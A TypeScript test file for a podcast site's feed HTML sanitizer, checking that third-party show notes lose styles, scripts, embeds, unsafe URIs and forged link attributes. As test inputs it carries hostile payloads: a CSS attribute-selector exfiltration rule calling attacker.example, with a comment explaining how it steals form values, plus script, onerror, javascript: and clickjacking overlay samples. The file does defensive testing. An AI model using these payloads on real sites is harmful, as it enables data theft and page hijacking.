// SPDX-License-Identifier: AGPL-3.0-or-later
// SPDX-FileCopyrightText: 2026 The Mosaicast Authors

import { describe, expect, it } from 'vitest';

import DOMPurify from 'dompurify';

import { sanitizeLikeHost } from '@mosaicast/plugin-sdk/testing';

import { EXTERNAL_LINK_REL, sanitizeFeedHtml } from './sanitize';

/**
 * Feed HTML is the only markup on the site that arrives from a third party and is inserted as markup.
 * DOMPurify's defaults stop script execution and permit styling; with `style-src 'unsafe-inline'` in the
 * policy — which the plugin UI contract requires — that made a podcast host's show notes a working
 * stylesheet on the episode page.
 */
describe('Feed HTML sanitizer', () => {
  it('keeps what show notes are actually made of', () => {
    const html = sanitizeFeedHtml(
      '<p>Notes with <strong>bold</strong>, <em>italics</em> and a ' +
        '<a href="https://example.com/x" title="t">link</a>.</p>' +
        '<ul><li>one</li><li>two</li></ul><img src="https://cdn.example/a.png" alt="art">',
    );

    expect(html).toContain('<strong>bold</strong>');
    expect(html).toContain('href="https://example.com/x"');
    expect(html).toContain('<li>one</li>');
    expect(html).toContain('src="https://cdn.example/a.png"');
    expect(html).toContain('alt="art"');
  });

  it('strips a <style> element, which is the exfiltration and click-jacking vector', () => {
    // `input[value^="a"]{background-image:url(https://attacker/a)}` reads rendered form values one character
    // at a time, and `img-src` allows any https: origin because artwork comes from arbitrary feed hosts — so
    // the request carrying the stolen character is permitted. Nothing here needs a stylesheet.
    const html = sanitizeFeedHtml(
      '<style>input[value^="a"]{background-image:url(https://attacker.example/a)}</style><p>Notes</p>',
    );

    expect(html).not.toContain('<style');
    expect(html).not.toContain('attacker.example');
    expect(html).toContain('<p>Notes</p>');
  });

  it('strips a style attribute, so no element can be positioned over the page', () => {
    const html = sanitizeFeedHtml(
      '<div style="position:fixed;inset:0;z-index:9999">overlay</div><b style="color:red">x</b>',
    );

    expect(html).not.toContain('style=');
    expect(html).not.toContain('position:fixed');
  });

  it('keeps no data-* or aria-* attribute, because the allow-list names neither (core#232)', () => {
    // DOMPurify allows both by default, outside ALLOWED_ATTR. A plugin marking its own elements with data-*
    // could not tell them from an author's: the wiki routes clicks on a[data-wiki].
    const html = sanitizeFeedHtml(
      '<p data-x="1" aria-label="y">text</p><a class="wiki-link" data-wiki="evil" href="/x">forged</a>',
    );

    expect(html).toBe('<p>text</p><a href="/x">forged</a>');
  });

  it('keeps the allowed attributes that are not URLs (core#232)', () => {
    // Every attribute DOMPurify does not know to be URI-safe was held to the URI regexp, so "de" and "10"
    // failed it and lang, dir, width, height, colspan and rowspan never survived.
    const html = sanitizeFeedHtml(
      '<p lang="de" dir="rtl">p</p><img src="https://cdn.example/a.png" alt="a" width="10" height="20">' +
        '<table><tbody><tr><td colspan="2" rowspan="3">c</td></tr></tbody></table>',
    );

    expect(html).toContain('<p lang="de" dir="rtl">');
    expect(html).toContain('width="10"');
    expect(html).toContain('height="20"');
    expect(html).toContain('colspan="2"');
    expect(html).toContain('rowspan="3"');
  });

  it('still holds href and src to the URI allow-list', () => {
    const html = sanitizeFeedHtml('<a href="data:text/html,x">a</a><img src="ftp://x/a.png" alt="b">');

    expect(html).not.toContain('data:');
    expect(html).not.toContain('ftp:');
  });

  it('agrees with the SDK test kit on what survives, so a plugin test means what it says in production', () => {
    // The kit applies FEED_HTML_POLICY literally. Any library default that widens the host past the policy —
    // the next ALLOW_* someone forgets — shows up here as a difference.
    const samples = [
      '<p data-x="1" aria-label="y" class="c" id="i" lang="de" dir="rtl" title="t">p</p>',
      '<a href="https://example.com/" data-wiki="w" aria-hidden="true" target="_top" rel="me">out</a>',
      '<img src="https://cdn.example/a.png" alt="a" width="10" height="10" data-src="x" loading="lazy">',
      '<table><tbody><tr><td colspan="2" rowspan="1" aria-sort="none" data-k="v">c</td></tr></tbody></table>',
    ];
    for (const sample of samples) {
      expect(sanitizeFeedHtml(sample), sample).toBe(sanitizeLikeHost(sample));
    }
  });

  it('still blocks script execution, as the defaults did', () => {
    const html = sanitizeFeedHtml(
      '<script>alert(1)</script><img src=x onerror="alert(1)"><a href="javascript:alert(1)">x</a>',
    );

    expect(html).not.toContain('<script');
    expect(html).not.toContain('onerror');
    expect(html).not.toContain('javascript:');
  });

  it('drops embedding elements a feed has no business supplying', () => {
    const html = sanitizeFeedHtml(
      '<iframe src="https://evil.example"></iframe><object data="x"></object>' +
        '<form action="/x"><input name="p"></form><link rel="stylesheet" href="https://evil.example/s.css">',
    );

    expect(html).not.toContain('<iframe');
    expect(html).not.toContain('<object');
    expect(html).not.toContain('<form');
    expect(html).not.toContain('<link');
  });

  it('refuses a data: URI in an href', () => {
    expect(sanitizeFeedHtml('<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>')).not.toContain('data:');
  });

  it('is empty for absent input rather than throwing', () => {
    expect(sanitizeFeedHtml(null)).toBe('');
    expect(sanitizeFeedHtml(undefined)).toBe('');
    expect(sanitizeFeedHtml('')).toBe('');
  });

  describe('links (core#169)', () => {
    const parse = (html: string) => {
      const template = document.createElement('template');
      template.innerHTML = sanitizeFeedHtml(html);
      return [...template.content.querySelectorAll('a')];
    };

    it('sends a link that leaves the site to a new tab, unendorsed', () => {
      // Following it in this tab tears the shell down and the audio with it — the one interruption the
      // persistent player exists to prevent.
      const [link] = parse('<p><a href="https://example.com/notes">notes</a></p>');

      expect(link.getAttribute('target')).toBe('_blank');
      expect(link.getAttribute('rel')).toBe(EXTERNAL_LINK_REL);
      expect(EXTERNAL_LINK_REL.split(' ')).toEqual(
        expect.arrayContaining(['noopener', 'noreferrer', 'nofollow', 'ugc']),
      );
    });

    it('leaves same-origin, mailto and fragment links in this tab', () => {
      const links = parse(
        `<a href="${window.location.origin}/episodes/x">abs</a><a href="/feeds/y">rel</a>` +
          '<a href="mailto:hi@example.com">mail</a><a href="#part-2">frag</a>',
      );

      expect(links).toHaveLength(4);
      links.forEach((link) => {
        expect(link.hasAttribute('target')).toBe(false);
        expect(link.hasAttribute('rel')).toBe(false);
      });
    });

    it('never keeps a target or rel the feed supplied', () => {
      // `target="_self"` on an external link would put the full navigation back; `rel="opener"` would hand
      // the opened page this one. Neither is the feed's call.
      const [external, internal] = parse(
        '<a href="https://example.com" target="_self" rel="opener">x</a>' +
          '<a href="/feeds/y" target="_top" rel="opener">y</a>',
      );

      expect(external.getAttribute('target')).toBe('_blank');
      expect(external.getAttribute('rel')).toBe(EXTERNAL_LINK_REL);
      expect(internal.hasAttribute('target')).toBe(false);
      expect(internal.hasAttribute('rel')).toBe(false);
    });

    it('does not leave its hook installed for anything else DOMPurify sanitizes', () => {
      sanitizeFeedHtml('<a href="https://example.com">x</a>');

      const other = DOMPurify.sanitize('<a href="https://example.com">x</a>', { ADD_ATTR: ['target'] });

      expect(other).not.toContain('target');
    });
  });
});
